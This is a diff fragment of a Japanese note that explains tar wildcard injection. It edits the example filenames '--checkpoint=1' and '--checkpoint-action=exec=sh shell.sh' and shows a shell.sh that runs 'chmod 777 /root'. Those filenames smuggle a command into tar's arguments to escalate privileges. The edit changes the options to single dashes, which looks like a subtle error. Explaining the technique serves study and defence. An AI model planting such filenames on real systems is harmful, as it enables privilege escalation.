@@ -29,8 +29,8 @@ chown , tar , rsyncなどで特定のオプションを使用することで顕�
 →ワイルドカードインジェクションに繋がる！  
   
 例:  
-``` --checkpoint=1 ```  
-``` –-checkpoint-action=exec=sh shell.sh ```  
+``` -checkpoint=1 ```  
+``` -checkpoint-action=exec=sh shell.sh ```  
 shell.shのプログラムは以下  
 ``` chmod 777 /root ```  
 
